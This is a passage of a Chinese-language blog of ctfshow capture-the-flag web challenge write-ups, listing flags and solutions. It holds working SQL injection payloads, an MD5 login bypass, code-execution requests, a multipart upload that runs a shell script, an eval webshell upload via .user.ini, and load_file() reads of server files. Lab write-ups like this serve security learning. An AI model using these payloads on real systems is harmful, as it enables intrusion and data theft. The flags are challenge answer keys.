class="line"></span><br><span class="line">        <span class="comment"># 如果某个字符不存在,则停止程序</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count &gt;= (<span class="number">128</span> - <span class="number">31</span>):</span><br><span class="line">            exit()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>运行脚本获取flag。</p><p>脚本运行时长3～4min。</p><p>![截屏2025-08-07 23.51.31](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-07 23.51.31.png)</p><hr><h2 id="09-web9"><a href="#09-web9" class="headerlink" title="09 web9"></a>09 web9</h2><p>🚩 flag：<code>ctfshow{7118d97d-e85c-4412-b904-b456ce669dfc}</code></p><p>SQL注入漏洞， SQL中使用MD5进行加密, 推荐使用MD5加密漏洞绕过。</p><p>我们访问根目录下的 robots.txt 文件</p><blockquote><p>obots.txt是一个文本文件,同时也是一个协议,规定了爬虫访问的规则( 哪些文件可以爬取,哪些文件不可以爬取)</p></blockquote><p>![截屏2025-08-08 09.15.56](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 09.15.56.png)</p><p>从robots.txt文件的内容中可以发现, 作者给了提示, index.phps文件应该就是此关卡的源码文件</p><p>访问 /index.phps 文件, 将其下载到本地, 从源码中可以发现, SQL中使用了md5()函数加密, 我们可以利用MD5加密漏洞来绕过</p><p>![截屏2025-08-08 09.21.26](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 09.21.26.png)</p><p>在密码框中输入 ffifdyop, 即可登录成功, 获取flag。</p><blockquote><p>ffifdyop 的MD5加密结果是 276f722736c95d99e921722cf9ed621c</p><p>经过MySQL编码后会变成’or’6xxx,使SQL恒成立,相当于万能密码,可以绕过md5()函数的加密</p></blockquote><p>![截屏2025-08-08 09.26.47](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 09.26.47.png)</p><h2 id="10-web10"><a href="#10-web10" class="headerlink" title="10 web10"></a>10 web10</h2><p>🚩 flag：<code>ctfshow{7130a0c5-2bb0-4599-8310-65940d31045f}</code></p><p>点击取消按钮，获得源码</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">""</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>{</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">"/(select|from|where|join|sleep|and|\s|union|,)/i"</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">""</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        }</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>))){</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"sql inject error"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>))){</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"sql inject error"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"select * from user where username = '<span class="subst">$username</span>'"</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>){</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>)){</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">'password'</span>]){</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"登陆成功&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"> }</span><br><span class="line">}</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>源码中先根据用户名查询用户信息, 用户名通过以后, 再判断密码是否相同, 我们绕过用户名的过滤条件, 在使用 with rollup注入绕过密码</p><blockquote><p>with rollup 可以对 group by 分组结果再次进行分组,并在最后添加一行数据用于展示结果( 对group by未指定的字段进行求和汇总, 而group by指定的分组字段则用null占位)<br>我们使用万能用户名 a’/<strong>/or/</strong>/true/**/# 使SQL成立绕过用户名之后, 后台的SQL会查询出所有的用户信息, 然后依次判断查询处的用户名对应的密码和我们输入的密码是否相同, 这时候我们使用with rollup 对 group by 分组的结果再次进行求和统计, 由于with rollup 不会对group by 分组的字段( password)进行统计, 所以会在返回结果的最后一行用null来填充password, 这样一来我们的返回结果中就有了一个值为null的password , 只要我们登录的时候password输入框什么都不输, 那我么输入的password的值就是null, 跟查询出的用户密码相同( null == null), 从而登录成功</p></blockquote><p>输入以下payload, 即可登录成功, 拿到flag</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">a<span class="comment">'/**/or/**/true/**/group/**/by/**/password/**/with/**/rollup/**/#</span></span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-08 09.43.32](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 09.43.32.png)</p><p>注意这里不输入密码。</p><p>以下题目来源： ctfshow web</p><p>(￣ω￣ )☞📦✨</p><h2 id="11-web11"><a href="#11-web11" class="headerlink" title="11 web11"></a>11 web11</h2><p>🚩 flag：<code>ctfshow{8feacf13-5148-47ac-8437-7317015a988b}</code></p><p>页面中直接给了源码, 很明显是让我们进行代码审计, 源码中将我们输入的密码与 session中保存的密码进行匹配, 两个password相同即可登录成功。</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>{</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">"/(select|from|where|join|sleep|and|\s|union|,)/i"</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">""</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>))){</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"sql inject error"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$_SESSION</span>[<span class="string">'password'</span>]){</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">        }</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>右键检查或者按F12, 进入开发者模式, 查看浏览器的session, 后端代码就是拿这个session的value值与我们输入的密码进行匹配, 由于这个value值我没解密出来, 所以这里干脆一点, 直接删除让变成空, 而后我们密码什么也不输, 也会是空, 空=空, 从而登录成功</p><p>![截屏2025-08-08 09.59.21](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 09.59.21.png)</p><p>登录结果：</p><p>![截屏2025-08-08 10.00.22](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 10.00.22.png)</p><hr><h2 id="12-web12"><a href="#12-web12" class="headerlink" title="12 web12"></a>12 web12</h2><p>🚩 flag：<code>ctfshow{f41d655e-ea9f-44ef-bca1-7d6db1438c80}</code></p><p>代码执行漏洞, flag藏在根目录下的一个文件中, 读取文件内容接口过关</p><p>![截屏2025-08-08 10.02.54](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 10.02.54.png)</p><p>这里暗示存在代码执行漏洞</p><p>传入cmd参数, 验证一下代码执行漏洞</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?cmd=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></tbody></table></figure><p>验证成功。</p><p>![截屏2025-08-08 10.04.13](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 10.04.13.png)</p><p>接下来遍历目录</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?cmd=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="string">'*'</span>));</span><br></pre></td></tr></tbody></table></figure><p>可以看到目录下有两个文件, 盲猜这个名字特殊的文件里面就有flag</p><p>![截屏2025-08-08 10.07.34](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 10.07.34.png)</p><p>接下来读取文件内容</p><blockquote><p>hightlight_file()可以使文件内容高亮显示, 常用于读取文件内容</p></blockquote><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?cmd=<span class="title function_ invoke__">highlight_file</span>(<span class="string">'903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php'</span>);</span><br></pre></td></tr></tbody></table></figure><p>即可得到flag。</p><p>![截屏2025-08-08 10.09.19](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 10.09.19.png)</p><hr><h2 id="13-红包题第二弹"><a href="#13-红包题第二弹" class="headerlink" title="13 红包题第二弹"></a>13 红包题第二弹</h2><p>🚩 flag：<code>ctfshow{bb633dfa-ae02-4002-b508-5850ca3609b0}</code></p><p>这里也是提示使用代码执行漏洞。</p><p>![截屏2025-08-08 10.15.15](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 10.15.15.png)</p><p>传入cmd参数, 验证一下代码执行漏洞</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?cmd=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-08 10.16.29](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 10.16.29.png)</p><p>有用但报错，显示出了页面源代码。查看显示出来部分php代码，过滤了很多东西</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">"/[A-Za-oq-z0-9$]+/"</span>,<span class="variable">$cmd</span>))</span><br></pre></td></tr></tbody></table></figure><p>第一个正则表达式把字母数字几乎全过滤了，只剩了个p（有伏笔！单独留个p肯定有用）</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">"/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/"</span>,<span class="variable">$cmd</span>)</span><br></pre></td></tr></tbody></table></figure><p>过滤了一堆符号。剩下的：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">&lt;  &gt;  ?  +  =  .  ;  `  /</span><br></pre></td></tr></tbody></table></figure><p><strong>&lt;?=  等价  &lt;?php echo</strong></p><p>这是php的短标记语法，相似的语句还有很多，大家自行查阅，在有些时候用这种语法绕过能有意想不到的惊喜</p><blockquote><p>反引号  ` 可以用来当作命令执行，例如`ls`和system(‘ls’)的效果是差不多的，我们可以利用这一点</p></blockquote><blockquote><p><code> .</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p></blockquote><p>那么我们就可以利用上述两个符号读取文件，例如<code>. $filename</code></p><p>加号 + 不必多说，通常用来当空格。</p><blockquote><p><strong>对于php本身而言，是可以进行文件上传的。</strong></p><p>我们可以发送一个上传文件的post包，此时php会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpxxxxxx，文件名最后6个字符是随机的大小写字母。如/tmp/phphhhhhh</p></blockquote><p>在这道题的话，我们可以用？代替这些字母，结果形如/??p/p?p??????</p><p>这样一来我们就可以通过<strong>上传带有payload的代码的文件并执行</strong>。</p><blockquote><p>但是值得一提的是，通常这些临时文件夹下的文件最后是会被删除的，所以我们不得不想办法在被删除之前执行我们上传的文件。最好的办法就是上传的时候同时执行。</p></blockquote><p>结合上述所说，我们就可以往cmd参数里写一段代码执行上传的文件，&lt;?=<code>.+/??p/p?p????</code>;</p><p>（加不加后面的?&gt;其实无所谓，都可以）</p><p>我们<strong>获取靶场数据包</strong>，将GET方式改为POST并且在请求头随便某处加入以下内容</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=hello1234567890</span><br></pre></td></tr></tbody></table></figure><p>修改后的数据包：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">POST /?cmd=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`.+/??p/p?p??????`; HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">3</span>d28a958-<span class="number">7048</span>-<span class="number">479</span>d-<span class="number">98</span>bb-<span class="number">1</span>be46e3dba1a.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">109.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Length: 237</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-----------------------------10242300956292313528205888</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name="fileUpload"; filename="1.txt"</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#! /bin/sh</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">cat /flag.txt</span></span><br><span class="line"><span class="comment">-----------------------------10242300956292313528205888--</span></span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-08 11.16.33](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 11.16.33.png)</p><p>得到flag。</p><hr><h2 id="14-web13"><a href="#14-web13" class="headerlink" title="14 web13"></a>14 web13</h2><p>🚩 flag：<code>ctfshow{bb633dfa-ae02-4002-b508-5850ca3609b0}</code></p><p>利用代码执行漏洞获取网站敏感文件</p><p>该题是有备份文件的，访问upload.php.bak</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"><span class="variable">$temp_name</span> = <span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"><span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'size'</span>];</span><br><span class="line"><span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'error'</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">'extension'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$size</span> &gt; <span class="number">24</span>){</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"error file zise"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>)&gt;<span class="number">9</span>){</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"error file name"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$ext_suffix</span>)&gt;<span class="number">3</span>){</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"error suffix"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">"/php/i"</span>,<span class="variable">$ext_suffix</span>)){</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"error suffix"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">"/php/i"</span>),<span class="variable">$filename</span>)){</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error file name"</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_name</span>, <span class="string">'./'</span>.<span class="variable">$filename</span>)){</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"文件上传成功！"</span>;</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"文件上传失败！"</span>;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>审计代码可以发现，传入的内容不可以大于24个字符，传入的名字不可以大于9个字符，不可以传php文件。</p><p>需要用到.user.ini文件，</p><p>先上传一个.user.ini文件，内容是auto_prepend_file=b.txt</p><p>然后再上传一个b.txt文件，内容是&lt;?php eval($_GET[‘c’]);  后面的不用写了，不然传不上去。</p><p>然后再通过参数c=print_r(scandir(‘.’));</p><hr><h2 id="15-web14"><a href="#15-web14" class="headerlink" title="15 web14"></a>15 web14</h2><p>🚩 flag：<code>ctfshow{5f9b6eee-ea21-414e-881d-aa619abf641c}</code></p><p>利用数据库读写功能读取网站敏感文件</p><p>绕过switch循环后可以拿到一个登录界面, 登录界面存在SQL注入, 脱库以后会提示flag在另一个文件中, 利用数据库的文件读写功能读取文件内容即可拿到flag</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"secret.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>]);</span><br><span class="line">    <span class="title function_ invoke__">sleep</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$c</span>) {</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'$url'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'@A@'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"@A@"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'@A@'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'@A@'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'@A@'</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'@A@'</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6000000</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"<span class="subst">$url</span>"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'@A@'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></tbody></table></figure><p>我们这里传递一个 3即可</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?c=<span class="number">3</span></span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-08 12.15.59](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 12.15.59.png)</p><p>访问一下这个文件：</p><p>![截屏2025-08-08 12.16.45](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 12.16.45.png)</p><p>进入一个这样的页面，盲猜存在SQL注入漏洞, 先给个true, 使SQL恒成立, 页面正常显示。</p><p>再给个false, 使SQL恒不成立, 页面空显示</p><p>由以上结果可以确定存在SQL注入漏洞, 注入点为数值型注入, 页面有回显, 推荐使用联合注入</p><p>获取当前使用的数据库：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="title function_ invoke__">database</span>()</span><br></pre></td></tr></tbody></table></figure><p>返回web。</p><p>获取表</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="title function_ invoke__">group_concat</span>(table_name)<span class="keyword">from</span><span class="comment">/**/</span>information_schema.`tables`<span class="comment">/**/</span>where<span class="comment">/**/</span>table_schema=<span class="title function_ invoke__">database</span>()</span><br></pre></td></tr></tbody></table></figure><p>返回content</p><p>获取字段</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="title function_ invoke__">group_concat</span>(column_name)<span class="keyword">from</span><span class="comment">/**/</span>information_schema.`columns`<span class="comment">/**/</span>where<span class="comment">/**/</span>table_name=<span class="string">'content'</span></span><br></pre></td></tr></tbody></table></figure><p>返回id,username,password</p><p>获取数据</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="title function_ invoke__">group_concat</span>(username,password)<span class="keyword">from</span><span class="comment">/**/</span>content</span><br></pre></td></tr></tbody></table></figure><p>返回adminflag is not here!,gtf1ywow,you can really dance,Wowtell you a secret,secret has a secret…</p><p>结合开头 switch循环页面中引入了一个 secret.php, 线索应该就在 secret.php 里面</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="title function_ invoke__">load_file</span>(<span class="string">'/var/www/html/secret.php'</span>)</span><br></pre></td></tr></tbody></table></figure><p>先访问一下 secret.php 文件, 可以正常访问, 没有报404, 说明这个文件确实存在, 而且就在根目录下, apache的默认网站根路径是 /var/www/html, 我们试一下读这个文件的内容</p><p>利用数据库的文件读写功能读取文件内容</p><p>页面没有反应</p><p>代理工具( BrupSuite)抓包，看到文件代码</p><p>根据提示读取 /real_flag_is_here</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="title function_ invoke__">load_file</span>(<span class="string">'/real_flag_is_here'</span>)</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-08 12.38.57](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 12.38.57.png)</p><p>在bp中获取到flag。</p><hr><p>以下为ctfshow web入门</p><h2 id="16-web1"><a href="#16-web1" class="headerlink" title="16 web1"></a>16 web1</h2><p>🚩 flag：<code>ctfshow{50fcb51b-4971-430c-8fc9-78879c46bf9a}</code></p><p>💡 hint：<code>签到题/查看页面源代码</code></p><p>查看页面源代码</p><p>![截屏2025-08-08 13.24.54](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 13.24.54.png)</p><p>得到flag。</p><hr><h2 id="17-web2"><a href="#17-web2" class="headerlink" title="17 web2"></a>17 web2</h2><p>🚩 flag：<code>ctfshow{197f6488-3254-408b-adcc-2ed7ffef61ec}</code></p><p>💡 hint：<code>查看页面源代码</code> <code>bp抓包</code></p><p>页面显示无法查看源代码。</p><p>![截屏2025-08-08 13.30.12](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 13.30.12.png)</p><p>通过bp抓包得到页面源代码，以及注释中的flag。</p><hr><h2 id="18-web3"><a href="#18-web3" class="headerlink" title="18 web3"></a>18 web3</h2><p>🚩 flag：<code>ctfshow{ec03e4fe-622c-4224-9120-b1e7486ff229}</code></p><p>💡 hint：<code>查看页面源代码</code> <code>bp抓包</code></p><p>通过bp抓包得到页面源代码，直接看到flag。</p><p>![截屏2025-08-08 13.35.04](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 13.35.04.png)</p><hr><h2 id="19-web4"><a href="#19-web4" class="headerlink" title="19 web4"></a>19 web4</h2><p>🚩 flag：<code>ctfshow{5f43bc89-39a8-4e6c-80d8-12dde2adc678}</code></p><p>💡 hint： <code>robots.txt</code></p><p>题目信息中有提示：总有人把后台地址写入robots，帮黑阔大佬们引路。</p><p>打开/robots.txt，查看提示。</p><p>页面信息：</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /flagishere.txt</span><br></pre></td></tr></tbody></table></figure><p>故打开文件/flagishere.txt，直接得到flag。</p><hr><h2 id="20-web5"><a href="#20-web5" class="headerlink" title="20 web5"></a>20 web5</h2><p>🚩 flag：<code>ctfshow{83e86a1e-e5c5-4dd4-bd6a-cfddc31e20dd}</code></p><p>💡 hint： <code>php源码泄漏</code></p><p>题目信息中提示：phps源码泄露有时候能帮上忙</p><p>在url末尾加/index.phps，返回phps文件，下载查看源码。</p><p>![截屏2025-08-08 13.51.51](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 13.51.51.png)</p><hr><h2 id="21-web6"><a href="#21-web6" class="headerlink" title="21 web6"></a>21 web6</h2><p>🚩 flag：<code>ctfshow{66576016-6a6d-456a-ba1d-a89db93ea7fa}</code></p><p>💡 hint： <code>www代码泄漏</code></p><p>题目提示：解压源码到当前目录，测试正常，收工。</p><p>Url/<a href="http://www.zip/">www.zip</a></p><p>获得源代码</p><p>![截屏2025-08-08 14.04.12](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 14.04.12.png)</p><p>直接打开fl000g.txt，得到flag{flag_here}，但是提交发现不正确。</p><p>使用url/fl000g.txt打开，然后检查页面源代码，发现</p><p>![截屏2025-08-08 14.06.11](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 14.06.11.png)</p><hr><h2 id="22-web7"><a href="#22-web7" class="headerlink" title="22 web7"></a>22 web7</h2><p>🚩 flag：<code>ctfshow{32f4258e-4332-4269-95d3-dfa77dfebada}</code></p><p>💡 hint： <code>版本控制文件泄漏</code></p><p>题目提示信息为：版本控制很重要，但不要部署到生产环境更重要。</p><p>考察git代码泄露，直接访问url/.git/index.php，获取到flag。</p><hr><h2 id="23-web8"><a href="#23-web8" class="headerlink" title="23 web8"></a>23 web8</h2><p>🚩 flag：<code>ctfshow{059a39a6-7189-4bfb-9b5e-43e598949d2f}</code></p><p>💡 hint： 